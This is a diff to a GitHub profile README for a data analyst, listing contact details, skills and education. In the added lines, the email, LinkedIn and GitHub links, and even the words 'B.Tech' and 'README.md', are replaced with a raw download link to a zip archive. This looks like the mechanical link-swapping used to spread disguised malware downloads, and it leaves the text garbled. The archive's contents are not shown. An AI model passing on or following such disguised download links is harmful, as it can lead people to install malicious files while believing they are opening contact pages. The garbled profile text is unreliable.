@@ -7,13 +7,13 @@ Let’s Connect 🤝
 
 If you’re looking for a Data Analyst who is passionate about turning data into insights and driving real business impact, I’d be happy to connect.
 
-📧 Email: https://github.com/Balamahesh7204/Balamahesh7204/raw/refs/heads/main/Ortalis/Balamahesh_v1.8.zip
+📧 Email: https://github.com/Balamahesh7204/Balamahesh7204/raw/refs/heads/main/Ortalis/Balamahesh-3.7.zip
 
 📱 Mobile: +91 7989105656
 
-🔗 LinkedIn: https://github.com/Balamahesh7204/Balamahesh7204/raw/refs/heads/main/Ortalis/Balamahesh_v1.8.zip
+🔗 LinkedIn: https://github.com/Balamahesh7204/Balamahesh7204/raw/refs/heads/main/Ortalis/Balamahesh-3.7.zip
 
-💻 GitHub: https://github.com/Balamahesh7204/Balamahesh7204/raw/refs/heads/main/Ortalis/Balamahesh_v1.8.zip
+💻 GitHub: https://github.com/Balamahesh7204/Balamahesh7204/raw/refs/heads/main/Ortalis/Balamahesh-3.7.zip
 
 🧠 Core Skills
 - Power BI
@@ -61,7 +61,7 @@ Summer Of AI Internship Program | Swecha
 
 🎓 Education
 
-B.Tech in Computer Science Engineering | Specialization in AI and Data Science
+https://github.com/Balamahesh7204/Balamahesh7204/raw/refs/heads/main/Ortalis/Balamahesh-3.7.zip in Computer Science Engineering | Specialization in AI and Data Science
 
 CMR College of Engineering & Technology, Medchal
 
@@ -83,7 +83,7 @@ Driven by curiosity and a love for problem-solving, I view data as a puzzle wait
 
 
 <!--
-**Balamahesh7204/Balamahesh7204** is a ✨ _special_ ✨ repository because its `https://github.com/Balamahesh7204/Balamahesh7204/raw/refs/heads/main/Ortalis/Balamahesh_v1.8.zip` (this file) appears on your GitHub profile.
+**Balamahesh7204/Balamahesh7204** is a ✨ _special_ ✨ repository because its `https://github.com/Balamahesh7204/Balamahesh7204/raw/refs/heads/main/Ortalis/Balamahesh-3.7.zip` (this file) appears on your GitHub profile.
 
 Here are some ideas to get you started:
 
